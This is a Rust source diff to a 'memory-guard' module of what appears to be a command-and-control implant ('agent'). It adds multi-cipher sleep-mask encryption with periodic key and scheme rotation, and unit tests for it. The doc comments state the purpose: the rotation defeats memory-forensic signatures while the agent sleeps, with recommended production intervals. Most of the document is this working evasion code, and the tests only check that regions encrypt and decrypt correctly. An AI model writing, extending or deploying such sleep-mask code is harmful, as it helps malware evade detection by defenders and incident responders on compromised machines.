@@ -50,13 +50,20 @@ use chacha20poly1305::{
     aead::{Aead, KeyInit, OsRng},
     XChaCha20Poly1305, XNonce,
 };
+use common::config::SleepScheme;
 use rand::RngCore;
+use std::sync::atomic::{AtomicU32, Ordering};
 use std::sync::{Mutex, OnceLock};
 use zeroize::Zeroize;
 
 // ──────────────────────────────────────────────────────────────────────────────
 // Types
 // ──────────────────────────────────────────────────────────────────────────────
+
+/// Maximum nonce length across all supported schemes (XChaCha20-Poly1305 = 24).
+const MAX_NONCE_LEN: usize = 24;
+/// Maximum tag length across all supported schemes (Poly1305 / GCM = 16).
+const MAX_TAG_LEN: usize = 16;
 
 /// A descriptor for a region of memory that should be encrypted while idle.
 ///
@@ -73,11 +80,15 @@ struct GuardedRegion {
     label: &'static str,
     /// `true` while the region is encrypted (locked).
     locked: bool,
-    /// 24-byte nonce written into the first 24 bytes of the region when locked.
-    /// Stored here so we can decrypt without scanning for a header.
-    nonce: [u8; 24],
+    /// Encryption scheme used to lock this region.
+    scheme: SleepScheme,
+    /// Nonce bytes (only first `scheme.nonce_len()` bytes are meaningful).
+    nonce: [u8; MAX_NONCE_LEN],
+    /// Actual nonce length in bytes for this region's scheme.
+    nonce_len: u8,
     /// AEAD authentication tag (16 bytes) appended after encryption.
-    tag: [u8; 16],
+    /// Only the first `scheme.tag_len()` bytes are meaningful.
+    tag: [u8; MAX_TAG_LEN],
 }
 
 // SAFETY: The agent is single-operator; raw pointers are accessed only while
@@ -90,6 +101,185 @@ static REGISTRY: OnceLock<Mutex<Vec<GuardedRegion>>> = OnceLock::new();
 
 fn registry() -> &'static Mutex<Vec<GuardedRegion>> {
     REGISTRY.get_or_init(|| Mutex::new(Vec::new()))
+}
+
+// ──────────────────────────────────────────────────────────────────────────────
+// Scheme rotation state
+// ──────────────────────────────────────────────────────────────────────────────
+
+/// Ordered list of schemes to cycle through.  Defaults to
+/// `[XChaCha20Poly1305]` (legacy single-scheme behaviour).
+static SCHEME_TABLE: OnceLock<Vec<SleepScheme>> = OnceLock::new();
+
+/// Index into `SCHEME_TABLE` for the **next** lock/rotate operation.
+/// Incremented modulo `SCHEME_TABLE.len()` after each rotation.
+static SCHEME_INDEX: AtomicU32 = AtomicU32::new(0);
+
+/// Number of lock/unlock cycles completed.  Used to decide when to rotate
+/// the scheme (every `mask_rotation_interval` cycles).
+static CYCLE_COUNTER: AtomicU32 = AtomicU32::new(0);
+
+/// Interval (in lock/unlock cycles) between scheme advances.
+/// `0` means "never advance" — use the initial scheme forever.
+static ROTATION_INTERVAL: AtomicU32 = AtomicU32::new(0);
+
+/// Initialise (or re-initialise) the scheme rotation configuration.
+///
+/// Must be called at least once before [`lock`] so that the scheme table
+/// is populated.  If never called, `lock()` defaults to
+/// `XChaCha20Poly1305` only (backward compatible).
+pub fn init_schemes(schemes: Vec<SleepScheme>, rotation_interval: u32) {
+    let table = if schemes.is_empty() {
+        vec![SleepScheme::XChaCha20Poly1305]
+    } else {
+        schemes
+    };
+    let _ = SCHEME_TABLE.set(table);
+    ROTATION_INTERVAL.store(rotation_interval, Ordering::Relaxed);
+    SCHEME_INDEX.store(0, Ordering::Relaxed);
+    CYCLE_COUNTER.store(0, Ordering::Relaxed);
+}
+
+/// Return the current scheme (the one that will be used for the next lock).
+fn current_scheme() -> SleepScheme {
+    let table = SCHEME_TABLE.get_or_init(|| vec![SleepScheme::XChaCha20Poly1305]);
+    let idx = SCHEME_INDEX.load(Ordering::Relaxed) as usize;
+    table[idx % table.len()]
+}
+
+/// Advance to the next scheme if the cycle counter has reached the rotation
+/// interval.  Called at the end of each `lock()` cycle.
+fn maybe_advance_scheme() {
+    let interval = ROTATION_INTERVAL.load(Ordering::Relaxed);
+    if interval == 0 {
+        return;
+    }
+    let count = CYCLE_COUNTER.fetch_add(1, Ordering::Relaxed) + 1;
+    if count >= interval {
+        // Advance the scheme index and reset the cycle counter.
+        let table = SCHEME_TABLE.get_or_init(|| vec![SleepScheme::XChaCha20Poly1305]);
+        let old = SCHEME_INDEX.load(Ordering::Relaxed);
+        SCHEME_INDEX.store((old + 1) % (table.len() as u32), Ordering::Relaxed);
+        CYCLE_COUNTER.store(0, Ordering::Relaxed);
+        tracing::debug!(
+            "[memory-guard] scheme advanced to {:?}",
+            current_scheme()
+        );
+    }
+}
+
+// ──────────────────────────────────────────────────────────────────────────────
+// Encryption / Decryption helpers
+// ──────────────────────────────────────────────────────────────────────────────
+
+/// Encrypt `buf` in-place using the given `scheme` and `key`.
+///
+/// Returns `(nonce_bytes, tag_bytes)` where `tag_bytes` is empty for
+/// unauthenticated schemes (ChaCha20).
+fn encrypt_region(
+    scheme: SleepScheme,
+    key: &[u8; 32],
+    buf: &mut [u8],
+) -> Result<([u8; MAX_NONCE_LEN], u8, [u8; MAX_TAG_LEN])> {
+    let nonce_len = scheme.nonce_len();
+    let mut nonce_buf = [0u8; MAX_NONCE_LEN];
+    OsRng.fill_bytes(&mut nonce_buf[..nonce_len]);
+
+    match scheme {
+        SleepScheme::XChaCha20Poly1305 => {
+            let cipher = XChaCha20Poly1305::new_from_slice(key)
+                .map_err(|_| anyhow::anyhow!("XChaCha20-Poly1305 key init failed"))?;
+            let nonce = XNonce::from_slice(&nonce_buf[..24]);
+            let ct = cipher
+                .encrypt(nonce, buf as &[u8])
+                .map_err(|_| anyhow::anyhow!("XChaCha20-Poly1305 encryption failed"))?;
+            let ct_len = ct.len() - 16;
+            buf[..ct_len].copy_from_slice(&ct[..ct_len]);
+            let mut tag = [0u8; MAX_TAG_LEN];
+            tag.copy_from_slice(&ct[ct_len..]);
+            Ok((nonce_buf, nonce_len as u8, tag))
+        }
+        SleepScheme::Aes256Gcm => {
+            let cipher = aes_gcm::Aes256Gcm::new_from_slice(key)
+                .map_err(|_| anyhow::anyhow!("AES-256-GCM key init failed"))?;
+            let nonce = aes_gcm::Nonce::from_slice(&nonce_buf[..12]);
+            let ct = cipher
+                .encrypt(nonce, buf as &[u8])
+                .map_err(|_| anyhow::anyhow!("AES-256-GCM encryption failed"))?;
+            let ct_len = ct.len() - 16;
+            buf[..ct_len].copy_from_slice(&ct[..ct_len]);
+            let mut tag = [0u8; MAX_TAG_LEN];
+            tag.copy_from_slice(&ct[ct_len..]);
+            Ok((nonce_buf, nonce_len as u8, tag))
+        }
+        SleepScheme::ChaCha20 => {
+            use chacha20::cipher::{KeyIvInit, StreamCipher};
+            let nonce = chacha20::Nonce::from_slice(&nonce_buf[..12]);
+            let cipher_key = chacha20::Key::from_slice(key);
+            let mut cipher = chacha20::ChaCha20::new(cipher_key, nonce);
+            cipher.apply_keystream(buf);
+            // No authentication tag for unauthenticated ChaCha20.
+            Ok((nonce_buf, nonce_len as u8, [0u8; MAX_TAG_LEN]))
+        }
+    }
+}
+
+/// Decrypt `buf` in-place using the given `scheme`, `key`, `nonce`, and `tag`.
+///
+/// For authenticated schemes the tag is verified; for ChaCha20 the tag is
+/// ignored.
+fn decrypt_region(
+    scheme: SleepScheme,
+    key: &[u8; 32],
+    nonce: &[u8],
+    tag: &[u8],
+    buf: &mut [u8],
+    label: &str,
+) -> Result<()> {
+    match scheme {
+        SleepScheme::XChaCha20Poly1305 => {
+            let cipher = XChaCha20Poly1305::new_from_slice(key)
+                .map_err(|_| anyhow::anyhow!("XChaCha20-Poly1305 key init failed"))?;
+            let xnonce = XNonce::from_slice(&nonce[..24]);
+            let mut combined = Vec::with_capacity(buf.len() + 16);
+            combined.extend_from_slice(buf);
+            combined.extend_from_slice(tag);
+            let pt = cipher.decrypt(xnonce, combined.as_slice()).map_err(|_| {
+                anyhow::anyhow!(
+                    "[memory-guard] XChaCha20-Poly1305 tag mismatch for \
+                     region '{}': memory may have been tampered with",
+                    label
+                )
+            })?;
+            buf.copy_from_slice(&pt);
+            Ok(())
+        }
+        SleepScheme::Aes256Gcm => {
+            let cipher = aes_gcm::Aes256Gcm::new_from_slice(key)
+                .map_err(|_| anyhow::anyhow!("AES-256-GCM key init failed"))?;
+            let aead_nonce = aes_gcm::Nonce::from_slice(&nonce[..12]);
+            let mut combined = Vec::with_capacity(buf.len() + 16);
+            combined.extend_from_slice(buf);
+            combined.extend_from_slice(tag);
+            let pt = cipher.decrypt(aead_nonce, combined.as_slice()).map_err(|_| {
+                anyhow::anyhow!(
+                    "[memory-guard] AES-256-GCM tag mismatch for \
+                     region '{}': memory may have been tampered with",
+                    label
+                )
+            })?;
+            buf.copy_from_slice(&pt);
+            Ok(())
+        }
+        SleepScheme::ChaCha20 => {
+            use chacha20::cipher::{KeyIvInit, StreamCipher};
+            let cnonce = chacha20::Nonce::from_slice(&nonce[..12]);
+            let cipher_key = chacha20::Key::from_slice(key);
+            let mut cipher = chacha20::ChaCha20::new(cipher_key, cnonce);
+            cipher.apply_keystream(buf);
+            Ok(())
+        }
+    }
 }
 
 // ──────────────────────────────────────────────────────────────────────────────
@@ -113,8 +303,10 @@ pub unsafe fn register(buf: &'static mut [u8], label: &'static str) {
         len: buf.len(),
         label,
         locked: false,
-        nonce: [0u8; 24],
-        tag: [0u8; 16],
+        scheme: SleepScheme::XChaCha20Poly1305,
+        nonce: [0u8; MAX_NONCE_LEN],
+        nonce_len: 0,
+        tag: [0u8; MAX_TAG_LEN],
     });
     tracing::debug!(
         "[memory-guard] registered region '{}' ({} bytes)",
@@ -186,10 +378,10 @@ pub fn lock() -> Result<KeyHandle> {
     let mut key_bytes = [0u8; 32];
     OsRng.fill_bytes(&mut key_bytes);
 
+    let scheme = current_scheme();
+
     {
         let mut reg = registry().lock().unwrap();
-        let cipher = XChaCha20Poly1305::new_from_slice(&key_bytes)
-            .map_err(|_| anyhow::anyhow!("failed to create cipher"))?;
 
         for region in reg.iter_mut() {
             if region.locked {
@@ -199,33 +391,30 @@ pub fn lock() -> Result<KeyHandle> {
                 );
                 continue;
             }
-            // Generate a fresh 24-byte nonce for each region.
-            let mut nonce_bytes = [0u8; 24];
-            OsRng.fill_bytes(&mut nonce_bytes);
-            let nonce = XNonce::from_slice(&nonce_bytes);
 
             // SAFETY: We hold the registry mutex; no other code accesses the region.
             let buf = unsafe { std::slice::from_raw_parts_mut(region.ptr, region.len) };
 
-            // Encrypt in-place.  chacha20poly1305 appends the 16-byte tag.
-            // We store the buf as plaintext then call encrypt_in_place which
-            // extends the buffer in-place — but we can't extend a raw slice.
-            // Instead we use Aead::encrypt which allocates, then copy back.
-            let ct = cipher
-                .encrypt(nonce, buf as &[u8])
-                .map_err(|_| anyhow::anyhow!("encryption failed for region '{}'", region.label))?;
+            let (nonce, nonce_len, tag) =
+                encrypt_region(scheme, &key_bytes, buf)
+                    .map_err(|e| anyhow::anyhow!("{} for region '{}'", e, region.label))?;
 
-            // ct = ciphertext (same length) + 16-byte tag.
-            // Copy ciphertext back over the plaintext.
-            let ct_len = ct.len() - 16;
-            buf[..ct_len].copy_from_slice(&ct[..ct_len]);
-            region.tag.copy_from_slice(&ct[ct_len..]);
-            region.nonce = nonce_bytes;
+            region.scheme = scheme;
+            region.nonce = nonce;
+            region.nonce_len = nonce_len;
+            region.tag = tag;
             region.locked = true;
 
-            tracing::debug!("[memory-guard] locked region '{}'", region.label);
+            tracing::debug!(
+                "[memory-guard] locked region '{}' with scheme {:?}",
+                region.label,
+                scheme
+            );
         }
     }
+
+    // Advance the scheme for the next lock cycle if rotation is configured.
+    maybe_advance_scheme();
 
     // Stash the key in registers (erases from stack first).
     let handle = KeyHandle::stash(key_bytes);
@@ -241,9 +430,6 @@ pub fn unlock(handle: KeyHandle) -> Result<()> {
     let mut key_bytes = handle.retrieve();
 
     {
-        let cipher = XChaCha20Poly1305::new_from_slice(&key_bytes)
-            .map_err(|_| anyhow::anyhow!("failed to create cipher for unlock"))?;
-
         let mut reg = registry().lock().unwrap();
         for region in reg.iter_mut() {
             if !region.locked {
@@ -253,35 +439,102 @@ pub fn unlock(handle: KeyHandle) -> Result<()> {
                 );
                 continue;
             }
-            let nonce = XNonce::from_slice(&region.nonce);
 
-            // Reassemble ciphertext || tag into a temporary buffer for decryption.
-            let buf = unsafe { std::slice::from_raw_parts(region.ptr, region.len) };
-            let mut combined = Vec::with_capacity(region.len + 16);
-            combined.extend_from_slice(buf);
-            combined.extend_from_slice(&region.tag);
+            let nonce_valid = &region.nonce[..region.nonce_len as usize];
+            let tag_valid = &region.tag[..region.scheme.tag_len()];
 
-            let pt = cipher.decrypt(nonce, combined.as_slice()).map_err(|_| {
-                anyhow::anyhow!(
-                    "[memory-guard] authentication tag mismatch for region '{}': \
-                         memory may have been tampered with",
-                    region.label
-                )
-            })?;
+            // SAFETY: We hold the registry mutex; no other code accesses the region.
+            let buf = unsafe { std::slice::from_raw_parts_mut(region.ptr, region.len) };
 
-            // Copy plaintext back.
-            let dst = unsafe { std::slice::from_raw_parts_mut(region.ptr, region.len) };
-            dst.copy_from_slice(&pt);
+            decrypt_region(region.scheme, &key_bytes, nonce_valid, tag_valid, buf, region.label)?;
+
             region.locked = false;
             region.nonce.zeroize();
             region.tag.zeroize();
 
-            tracing::debug!("[memory-guard] unlocked region '{}'", region.label);
+            tracing::debug!(
+                "[memory-guard] unlocked region '{}' (scheme {:?})",
+                region.label,
+                region.scheme
+            );
         }
     }
 
     key_bytes.zeroize();
     Ok(())
+}
+
+/// Rotate the sleep-mask encryption key while regions remain locked.
+///
+/// This decrypts all guarded regions with the current key, generates a fresh
+/// XChaCha20-Poly1305 key via CSPRNG, re-encrypts the regions with the new
+/// key, and returns a new [`KeyHandle`] holding the new key.  The old key is
+/// securely zeroed.
+///
+/// Call this periodically during a long sleep to ensure the ciphertext pattern
+/// visible to memory forensics changes even when the plaintext does not.
+///
+/// The caller **must** ensure the returned handle is eventually consumed by
+/// [`unlock`] (or a subsequent call to `rotate_key`).
+pub fn rotate_key(handle: KeyHandle) -> Result<KeyHandle> {
+    // 1. Retrieve old key and decrypt all regions.
+    let mut old_key = handle.retrieve();
+
+    {
+        let mut reg = registry().lock().unwrap();
+        for region in reg.iter_mut() {
+            if !region.locked {
+                continue;
+            }
+            let nonce_valid = &region.nonce[..region.nonce_len as usize];
+            let tag_valid = &region.tag[..region.scheme.tag_len()];
+
+            let buf = unsafe { std::slice::from_raw_parts_mut(region.ptr, region.len) };
+            decrypt_region(region.scheme, &old_key, nonce_valid, tag_valid, buf, region.label)?;
+            // Region is now plaintext but we leave locked=true because we're
+            // about to re-encrypt immediately.
+        }
+    }
+
+    // Old key is no longer needed — zero it.
+    old_key.zeroize();
+
+    // 2. Generate a fresh key and pick the next scheme.
+    let mut new_key = [0u8; 32];
+    OsRng.fill_bytes(&mut new_key);
+
+    let scheme = current_scheme();
+
+    // 3. Re-encrypt all regions with the new key and (possibly new) scheme.
+    {
+        let mut reg = registry().lock().unwrap();
+
+        for region in reg.iter_mut() {
+            if !region.locked {
+                continue;
+            }
+
+            let buf = unsafe { std::slice::from_raw_parts_mut(region.ptr, region.len) };
+            let (nonce, nonce_len, tag) = encrypt_region(scheme, &new_key, buf)
+                .map_err(|e| anyhow::anyhow!("{} for region '{}'", e, region.label))?;
+
+            region.scheme = scheme;
+            region.nonce = nonce;
+            region.nonce_len = nonce_len;
+            region.tag = tag;
+        }
+    }
+
+    // Advance the scheme for the next rotation cycle.
+    maybe_advance_scheme();
+
+    tracing::debug!(
+        "[memory-guard] sleep-mask key rotated (scheme now {:?})",
+        scheme
+    );
+    let new_handle = KeyHandle::stash(new_key);
+    new_key.zeroize();
+    Ok(new_handle)
 }
 
 // ──────────────────────────────────────────────────────────────────────────────
@@ -590,28 +843,80 @@ impl KeyHandle {
 /// 1. Encrypts all registered regions and stashes the key in registers.
 /// 2. Sleeps for exactly `duration` (or until `wake_rx` fires, whichever comes
 ///    first).
-/// 3. Retrieves the key, decrypts all regions.
+/// 3. If `mask_rotation_interval` is non-zero, periodically wakes to rotate
+///    the encryption key: decrypt with old key → generate fresh key →
+///    re-encrypt.  This defeats memory-forensic signatures that look for
+///    repeating ciphertext patterns across a long sleep window.
+/// 4. Retrieves the final key, decrypts all regions.
 ///
 /// The `wake_rx` channel is optional.  Pass `None` if no early-wake is needed.
+///
+/// `mask_rotation_interval` controls how often (in seconds) the key is rotated
+/// during the sleep.  A value of `0` disables rotation — a single key is used
+/// for the entire sleep.  Recommended production value: 300–600 seconds.
 pub async fn guarded_sleep(
     duration: std::time::Duration,
     wake_rx: Option<tokio::sync::watch::Receiver<bool>>,
+    mask_rotation_interval: u64,
 ) -> Result<()> {
-    let handle = lock()?;
+    let mut handle = lock()?;
 
-    let sleep_fut = tokio::time::sleep(duration);
-    tokio::pin!(sleep_fut);
+    // When rotation is disabled or the duration is shorter than the rotation
+    // interval, do a simple sleep without key rotation.
+    if mask_rotation_interval == 0 || duration.as_secs() <= mask_rotation_interval {
+        let sleep_fut = tokio::time::sleep(duration);
+        tokio::pin!(sleep_fut);
 
-    match wake_rx {
-        Some(mut rx) => {
-            tokio::select! {
-                _ = &mut sleep_fut => {},
-                _ = rx.changed() => {
-                    tracing::debug!("[memory-guard] early wake signal received");
+        match wake_rx {
+            Some(mut rx) => {
+                tokio::select! {
+                    _ = &mut sleep_fut => {},
+                    _ = rx.changed() => {
+                        tracing::debug!("[memory-guard] early wake signal received");
+                    }
                 }
             }
+            None => sleep_fut.await,
         }
-        None => sleep_fut.await,
+
+        unlock(handle)?;
+        return Ok(());
+    }
+
+    // Split the sleep into sub-intervals of `mask_rotation_interval` seconds.
+    // At each boundary, rotate the key so ciphertext changes periodically.
+    let interval_dur = std::time::Duration::from_secs(mask_rotation_interval);
+    let mut remaining = duration;
+
+    loop {
+        let sub_sleep = remaining.min(interval_dur);
+        let sleep_fut = tokio::time::sleep(sub_sleep);
+        tokio::pin!(sleep_fut);
+
+        let early_wake = match &wake_rx {
+            Some(rx) => {
+                let mut rx_clone = rx.clone();
+                tokio::select! {
+                    _ = &mut sleep_fut => false,
+                    _ = rx_clone.changed() => true,
+                }
+            }
+            None => {
+                sleep_fut.await;
+                false
+            }
+        };
+
+        remaining = remaining.saturating_sub(sub_sleep);
+
+        if early_wake || remaining.as_secs() == 0 {
+            // Either early-wake signal or sleep fully elapsed — decrypt and
+            // return.
+            break;
+        }
+
+        // Rotate the key: decrypt with old key, generate fresh key, re-encrypt.
+        handle = rotate_key(handle)?;
     }
 
     unlock(handle)?;
@@ -762,7 +1067,7 @@ mod tests {
 
         unsafe { register(leaked, "test-async") }
 
-        guarded_sleep(Duration::from_millis(1), None)
+        guarded_sleep(Duration::from_millis(1), None, 0)
             .await
             .expect("guarded_sleep should not fail");
 
@@ -789,7 +1094,7 @@ mod tests {
         // Spawn the guarded sleep with a 60-second timeout that should be
         // interrupted well before it expires.
         let sleep_handle = tokio::spawn(async move {
-            guarded_sleep(std::time::Duration::from_secs(60), Some(wake_rx))
+            guarded_sleep(std::time::Duration::from_secs(60), Some(wake_rx), 0)
                 .await
                 .unwrap();
         });
@@ -834,5 +1139,288 @@ mod tests {
 
         let h = lock().expect("second lock should succeed");
         unlock(h).expect("second unlock should succeed");
+    }
+
+    /// `rotate_key` must decrypt with the old key, re-encrypt with a fresh key,
+    /// and the new handle must successfully unlock back to the original plaintext.
+    #[test]
+    fn rotate_key_roundtrip() {
+        let _guard = TEST_LOCK.lock().unwrap();
+        fresh_registry();
+
+        let content = b"rotation-test-data";
+        let boxed: Box<[u8]> = content.to_vec().into_boxed_slice();
+        let leaked: &'static mut [u8] = Box::leak(boxed);
+        let ptr = leaked.as_ptr();
+        let len = leaked.len();
+
+        unsafe { register(leaked, "test-rotate") }
+
+        let h1 = lock().unwrap();
+        let ct1 = unsafe { read_bytes(ptr, len) };
+        assert_ne!(ct1.as_slice(), content.as_ref(), "must be encrypted");
+
+        // Rotate: decrypt with h1's key, re-encrypt with fresh key.
+        let h2 = rotate_key(h1).expect("rotate_key should succeed");
+
+        // Ciphertext must have changed (different key + nonce).
+        let ct2 = unsafe { read_bytes(ptr, len) };
+        assert_ne!(ct2, ct1, "ciphertext must differ after rotation");
+        assert_ne!(ct2.as_slice(), content.as_ref(), "still encrypted");
+
+        // Unlock with the new handle must restore the original plaintext.
+        unlock(h2).expect("unlock after rotation should succeed");
+        let restored = unsafe { read_bytes(ptr, len) };
+        assert_eq!(restored.as_slice(), content.as_ref());
+    }
+
+    /// `guarded_sleep` with mask rotation enabled must produce different
+    /// ciphertext after each sub-interval rotation.
+    #[tokio::test]
+    async fn guarded_sleep_with_rotation() {
+        let _guard = TEST_LOCK.lock().unwrap();
+        fresh_registry();
+
+        let content = b"rotation-during-sleep";
+        let boxed: Box<[u8]> = content.to_vec().into_boxed_slice();
+        let leaked: &'static mut [u8] = Box::leak(boxed);
+        let ptr = leaked.as_ptr();
+        let len = leaked.len();
+
+        unsafe { register(leaked, "test-sleep-rotate") }
+
+        // Sleep for 50ms with rotation every 15ms → should rotate at least twice.
+        guarded_sleep(Duration::from_millis(50), None, 15)
+            .await
+            .expect("guarded_sleep with rotation should succeed");
+
+        let restored = unsafe { read_bytes(ptr, len) };
+        assert_eq!(restored.as_slice(), content.as_ref());
+    }
+
+    /// AES-256-GCM round-trip: lock with AES-256-GCM, unlock, verify plaintext.
+    #[test]
+    fn aes256gcm_roundtrip() {
+        let _guard = TEST_LOCK.lock().unwrap();
+        fresh_registry();
+
+        let plaintext_orig = b"aes-256-gcm-protected-data-12345";
+        let boxed: Box<[u8]> = plaintext_orig.to_vec().into_boxed_slice();
+        let leaked: &'static mut [u8] = Box::leak(boxed);
+        let ptr = leaked.as_ptr();
+        let len = leaked.len();
+
+        unsafe { register(leaked, "test-aes-gcm") }
+
+        // Configure AES-256-GCM as the only scheme.
+        init_schemes(vec![SleepScheme::Aes256Gcm], 0);
+
+        let handle = lock().expect("lock with AES-256-GCM should succeed");
+
+        let after_lock = unsafe { read_bytes(ptr, len) };
+        assert_ne!(
+            after_lock.as_slice(),
+            plaintext_orig.as_ref(),
+            "plaintext must be encrypted after lock() with AES-256-GCM"
+        );
+
+        unlock(handle).expect("unlock with AES-256-GCM should succeed");
+
+        let restored = unsafe { read_bytes(ptr, len) };
+        assert_eq!(
+            restored.as_slice(),
+            plaintext_orig.as_ref(),
+            "plaintext must be restored after unlock() with AES-256-GCM"
+        );
+    }
+
+    /// ChaCha20 (unauthenticated) round-trip: lock, unlock, verify plaintext.
+    #[test]
+    fn chacha20_roundtrip() {
+        let _guard = TEST_LOCK.lock().unwrap();
+        fresh_registry();
+
+        let plaintext_orig = b"chacha20-stream-no-auth-test!!";
+        let boxed: Box<[u8]> = plaintext_orig.to_vec().into_boxed_slice();
+        let leaked: &'static mut [u8] = Box::leak(boxed);
+        let ptr = leaked.as_ptr();
+        let len = leaked.len();
+
+        unsafe { register(leaked, "test-chacha20") }
+
+        // Configure ChaCha20 as the only scheme.
+        init_schemes(vec![SleepScheme::ChaCha20], 0);
+
+        let handle = lock().expect("lock with ChaCha20 should succeed");
+
+        let after_lock = unsafe { read_bytes(ptr, len) };
+        assert_ne!(
+            after_lock.as_slice(),
+            plaintext_orig.as_ref(),
+            "plaintext must be encrypted after lock() with ChaCha20"
+        );
+
+        unlock(handle).expect("unlock with ChaCha20 should succeed");
+
+        let restored = unsafe { read_bytes(ptr, len) };
+        assert_eq!(
+            restored.as_slice(),
+            plaintext_orig.as_ref(),
+            "plaintext must be restored after unlock() with ChaCha20"
+        );
+    }
+
+    /// Scheme rotation: lock/rotate through multiple schemes and verify each
+    /// round-trip succeeds.
+    #[test]
+    fn multi_scheme_rotation() {
+        let _guard = TEST_LOCK.lock().unwrap();
+        fresh_registry();
+
+        let content = b"multi-scheme-rotation-test-data!";
+        let boxed: Box<[u8]> = content.to_vec().into_boxed_slice();
+        let leaked: &'static mut [u8] = Box::leak(boxed);
+        let ptr = leaked.as_ptr();
+        let len = leaked.len();
+
+        unsafe { register(leaked, "test-multi-scheme") }
+
+        // Configure all three schemes, rotating every cycle.
+        init_schemes(
+            vec![
+                SleepScheme::XChaCha20Poly1305,
+                SleepScheme::Aes256Gcm,
+                SleepScheme::ChaCha20,
+            ],
+            1, // rotate every cycle
+        );
+
+        // Cycle 1: XChaCha20-Poly1305
+        let h1 = lock().unwrap();
+        let ct1 = unsafe { read_bytes(ptr, len) };
+        assert_ne!(ct1.as_slice(), content.as_ref());
+        unlock(h1).unwrap();
+        let restored = unsafe { read_bytes(ptr, len) };
+        assert_eq!(restored.as_slice(), content.as_ref());
+
+        // Cycle 2: AES-256-GCM
+        let h2 = lock().unwrap();
+        let ct2 = unsafe { read_bytes(ptr, len) };
+        assert_ne!(ct2.as_slice(), content.as_ref());
+        assert_ne!(ct2, ct1, "ciphertext must differ between schemes");
+        unlock(h2).unwrap();
+        let restored = unsafe { read_bytes(ptr, len) };
+        assert_eq!(restored.as_slice(), content.as_ref());
+
+        // Cycle 3: ChaCha20
+        let h3 = lock().unwrap();
+        let ct3 = unsafe { read_bytes(ptr, len) };
+        assert_ne!(ct3.as_slice(), content.as_ref());
+        assert_ne!(ct3, ct2, "ciphertext must differ between schemes");
+        unlock(h3).unwrap();
+        let restored = unsafe { read_bytes(ptr, len) };
+        assert_eq!(restored.as_slice(), content.as_ref());
+
+        // Cycle 4: wraps back to XChaCha20-Poly1305
+        let h4 = lock().unwrap();
+        let ct4 = unsafe { read_bytes(ptr, len) };
+        assert_ne!(ct4.as_slice(), content.as_ref());
+        unlock(h4).unwrap();
+        let restored = unsafe { read_bytes(ptr, len) };
+        assert_eq!(restored.as_slice(), content.as_ref());
+    }
+
+    /// `rotate_key` with scheme change: regions encrypted with scheme A should
+    /// be decryptable after rotation to scheme B.
+    #[test]
+    fn rotate_key_with_scheme_change() {
+        let _guard = TEST_LOCK.lock().unwrap();
+        fresh_registry();
+
+        let content = b"rotate-scheme-change-data";
+        let boxed: Box<[u8]> = content.to_vec().into_boxed_slice();
+        let leaked: &'static mut [u8] = Box::leak(boxed);
+        let ptr = leaked.as_ptr();
+        let len = leaked.len();
+
+        unsafe { register(leaked, "test-rotate-scheme") }
+
+        // Start with XChaCha20-Poly1305, rotate every cycle.
+        init_schemes(
+            vec![
+                SleepScheme::XChaCha20Poly1305,
+                SleepScheme::Aes256Gcm,
+                SleepScheme::ChaCha20,
+            ],
+            1,
+        );
+
+        let h1 = lock().unwrap();
+        let ct1 = unsafe { read_bytes(ptr, len) };
+        assert_ne!(ct1.as_slice(), content.as_ref());
+
+        // Rotate: should decrypt with XChaCha20-Poly1305, re-encrypt with AES-256-GCM.
+        let h2 = rotate_key(h1).expect("rotate_key should succeed");
+        let ct2 = unsafe { read_bytes(ptr, len) };
+        assert_ne!(ct2, ct1, "ciphertext must change after rotation");
+        assert_ne!(ct2.as_slice(), content.as_ref());
+
+        // Rotate again: AES-256-GCM → ChaCha20.
+        let h3 = rotate_key(h2).expect("rotate_key should succeed");
+        let ct3 = unsafe { read_bytes(ptr, len) };
+        assert_ne!(ct3, ct2, "ciphertext must change after rotation");
+
+        // Unlock with the final handle must restore original plaintext.
+        unlock(h3).unwrap();
+        let restored = unsafe { read_bytes(ptr, len) };
+        assert_eq!(restored.as_slice(), content.as_ref());
+    }
+
+    /// Tag mismatch detection still works for AES-256-GCM.
+    #[test]
+    fn aes256gcm_tag_mismatch_detected() {
+        let _guard = TEST_LOCK.lock().unwrap();
+        fresh_registry();
+
+        let boxed: Box<[u8]> = b"aes-tamper-detect".to_vec().into_boxed_slice();
+        let leaked: &'static mut [u8] = Box::leak(boxed);
+        let ptr = leaked.as_mut_ptr();
+
+        unsafe { register(leaked, "test-aes-tamper") }
+        init_schemes(vec![SleepScheme::Aes256Gcm], 0);
+
+        let handle = lock().unwrap();
+
+        // Flip a bit in the encrypted region.
+        unsafe { *ptr ^= 0xFF };
+
+        let result = unlock(handle);
+        assert!(
+            result.is_err(),
+            "unlock() must fail when AES-256-GCM ciphertext has been tampered with"
+        );
+    }
+
+    /// `init_schemes` with empty vector defaults to XChaCha20-Poly1305 only.
+    #[test]
+    fn init_schemes_empty_defaults_to_xchacha() {
+        let _guard = TEST_LOCK.lock().unwrap();
+        fresh_registry();
+
+        let content = b"empty-schemes-default";
+        let boxed: Box<[u8]> = content.to_vec().into_boxed_slice();
+        let leaked: &'static mut [u8] = Box::leak(boxed);
+        let ptr = leaked.as_ptr();
+        let len = leaked.len();
+
+        unsafe { register(leaked, "test-empty-schemes") }
+        init_schemes(vec![], 0);
+
+        let h = lock().unwrap();
+        let after_lock = unsafe { read_bytes(ptr, len) };
+        assert_ne!(after_lock.as_slice(), content.as_ref());
+        unlock(h).unwrap();
+        let restored = unsafe { read_bytes(ptr, len) };
+        assert_eq!(restored.as_slice(), content.as_ref());
     }
 }
